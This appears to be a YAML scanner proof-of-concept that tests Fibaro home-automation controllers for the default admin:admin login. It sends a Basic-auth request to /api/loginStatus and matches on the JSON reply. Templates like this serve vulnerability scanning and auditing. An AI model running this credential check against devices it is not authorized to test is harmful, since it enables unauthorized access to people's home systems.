name: poc-yaml-fibaro-default-password

transport: http
rules:
  fibaro:
    request:
      method: GET
      path: "/api/loginStatus"
      headers:
        Authorization: Basic YWRtaW46YWRtaW4=
    expression: |
      response.status == 200 && response.body.bcontains(b"admin") && response.body.bcontains(b"analyticsUserIdHash") && response.headers["Content-Type"].contains("application/json")

expression: 
  fibaro()

detail:
  author: iak3ec(https://github.com/nu0l)
  description: fibaro-default-password
  links:
    -  https://www.92ez.com/?action=show&id=23421